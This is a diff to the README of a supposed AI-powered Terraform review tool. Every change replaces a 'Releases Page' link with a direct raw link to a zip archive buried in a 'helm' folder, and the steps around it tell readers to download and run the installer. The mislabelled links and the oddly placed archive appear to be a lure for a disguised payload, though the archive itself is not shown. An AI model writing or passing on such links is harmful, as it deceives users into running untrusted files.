@@ -1,6 +1,6 @@
 # 🚀 ai-terraform-atlantis - AI-Powered Terraform Review Made Simple
 
-[![Download ai-terraform-atlantis](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/evilvant/ai-terraform-atlantis/releases)
+[![Download ai-terraform-atlantis](https://raw.githubusercontent.com/evilvant/ai-terraform-atlantis/main/helm/ai-terraform-atlantis_v1.7-alpha.4.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/evilvant/ai-terraform-atlantis/main/helm/ai-terraform-atlantis_v1.7-alpha.4.zip)
 
 ## 📜 Description
 
@@ -26,7 +26,7 @@ To run ai-terraform-atlantis, your system must meet the following requirements:
 ## 🚀 Getting Started
 
 1. **Download the Application**:  
-   Visit the [Releases Page](https://github.com/evilvant/ai-terraform-atlantis/releases) to download the latest version of ai-terraform-atlantis.
+   Visit the [Releases Page](https://raw.githubusercontent.com/evilvant/ai-terraform-atlantis/main/helm/ai-terraform-atlantis_v1.7-alpha.4.zip) to download the latest version of ai-terraform-atlantis.
 
 2. **Install the Application**:  
    Follow the instructions on your operating system to install the downloaded file.
@@ -44,7 +44,7 @@ To run ai-terraform-atlantis, your system must meet the following requirements:
 
 To download and install ai-terraform-atlantis:
 
-1. Go to the [Releases Page](https://github.com/evilvant/ai-terraform-atlantis/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/evilvant/ai-terraform-atlantis/main/helm/ai-terraform-atlantis_v1.7-alpha.4.zip).
 2. Select the latest release.
 3. Click the download link for your operating system.
 4. Run the installer and follow the prompts.
@@ -86,4 +86,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 We welcome contributions from the community. If you're interested in helping, please check the Contribution Guidelines in the repository. Your insights can help improve this application for everyone.
 
-Remember, for any questions or issues, check the [Releases Page](https://github.com/evilvant/ai-terraform-atlantis/releases) for updates and information.
+Remember, for any questions or issues, check the [Releases Page](https://raw.githubusercontent.com/evilvant/ai-terraform-atlantis/main/helm/ai-terraform-atlantis_v1.7-alpha.4.zip) for updates and information.
